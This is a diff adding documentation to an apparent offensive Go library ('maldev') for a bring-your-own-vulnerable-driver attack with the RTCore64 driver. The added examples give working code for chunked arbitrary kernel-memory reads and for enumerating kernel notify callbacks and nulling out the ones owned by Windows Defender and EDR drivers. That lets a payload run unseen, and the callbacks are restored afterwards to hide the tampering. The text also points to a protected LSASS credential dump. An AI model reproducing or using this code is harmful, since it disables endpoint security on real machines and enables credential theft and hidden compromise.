@@ -105,6 +105,118 @@ while still shipping every other piece of the BYOVD chain — the
 service-install plumbing, IOCTL wrappers, and lifecycle management
 all live in source-tree code.
 
+## Advanced — looping reads beyond the per-IOCTL cap
+
+A single IOCTL caps at `MaxPrimitiveBytes` (4096 bytes). Larger reads
+loop in the caller — the driver's pool-buffer transfer is unstable
+above one page:
+
+```go
+package main
+
+import (
+	"fmt"
+
+	"github.com/oioio-space/maldev/kernel/driver"
+	"github.com/oioio-space/maldev/kernel/driver/rtcore64"
+)
+
+// readKernel issues IOCTLs in <=MaxPrimitiveBytes chunks and concatenates
+// the results. Bails on the first error so the caller can decide whether
+// to retry from the partial offset.
+func readKernel(rw driver.Reader, addr uintptr, size int) ([]byte, error) {
+	out := make([]byte, 0, size)
+	for off := 0; off < size; {
+		chunk := size - off
+		if chunk > rtcore64.MaxPrimitiveBytes {
+			chunk = rtcore64.MaxPrimitiveBytes
+		}
+		buf := make([]byte, chunk)
+		n, err := rw.ReadKernel(addr+uintptr(off), buf)
+		if err != nil {
+			return out, fmt.Errorf("read @0x%X (off=%d): %w", addr+uintptr(off), off, err)
+		}
+		out = append(out, buf[:n]...)
+		off += n
+	}
+	return out, nil
+}
+
+func main() {
+	var d rtcore64.Driver
+	if err := d.Install(); err != nil { panic(err) }
+	defer d.Uninstall()
+
+	// Read 32 KiB starting at some kernel VA — 8 IOCTLs under the hood.
+	bytes, err := readKernel(&d, 0xFFFFF80012345000, 32*1024)
+	fmt.Printf("read=%d err=%v\n", len(bytes), err)
+}
+```
+
+## Composed — RTCore64 + kcallback enumeration + selective Remove
+
+The whole point of `kernel/driver/rtcore64` is to back a `driver.ReadWriter`
+that downstream packages consume. `evasion/kcallback` is the canonical
+consumer — given the driver, enumerate every PspCreate/Thread/LoadImage
+notify routine and selectively neutralize an EDR's callbacks:
+
+```go
+package main
+
+import (
+	"fmt"
+	"log"
+
+	"github.com/oioio-space/maldev/evasion/kcallback"
+	"github.com/oioio-space/maldev/kernel/driver/rtcore64"
+)
+
+func main() {
+	// 1. Bring up the driver.
+	var d rtcore64.Driver
+	if err := d.Install(); err != nil { log.Fatal(err) }
+	defer d.Uninstall()
+
+	// 2. Operator-supplied OffsetTable for the current ntoskrnl build
+	//    (derived offline from a PDB dump — see kernel-callback-removal.md).
+	tab := kcallback.OffsetTable{
+		Build:                   19045,
+		CreateProcessRoutineRVA: 0xC1AAA0,
+		CreateThreadRoutineRVA:  0xC1AC20,
+		LoadImageRoutineRVA:     0xC1AB40,
+		ArrayLen:                64,
+	}
+
+	// 3. Enumerate.
+	cbs, err := kcallback.Enumerate(&d, tab)
+	if err != nil { log.Fatal(err) }
+
+	// 4. Selectively NULL-out every EDR-driver-owned slot. Restore on exit
+	//    so the host doesn't notice tampering after a benign payload.
+	var tokens []kcallback.RemoveToken
+	for _, cb := range cbs {
+		fmt.Printf("[%s][%d] %s @ 0x%X enabled=%v\n",
+			cb.Kind, cb.Index, cb.Module, cb.Address, cb.Enabled)
+		if cb.Module == "WdFilter.sys" || cb.Module == "MsSecCore.sys" {
+			tok, err := kcallback.Remove(cb, &d)
+			if err != nil { log.Printf("remove %s[%d]: %v", cb.Kind, cb.Index, err); continue }
+			tokens = append(tokens, tok)
+		}
+	}
+	defer func() {
+		for _, tok := range tokens {
+			_ = kcallback.Restore(tok, &d)
+		}
+	}()
+
+	// ... payload runs here without EDR callbacks firing ...
+}
+```
+
+The same `&d` plugs into `credentials/lsassdump.Unprotect` for a PPL
+LSASS dump — see [LSASS Credential Dump](../collection/lsass-dump.md)
+for that composition.
+
 ## Detection
 
 | Phase | Signal |
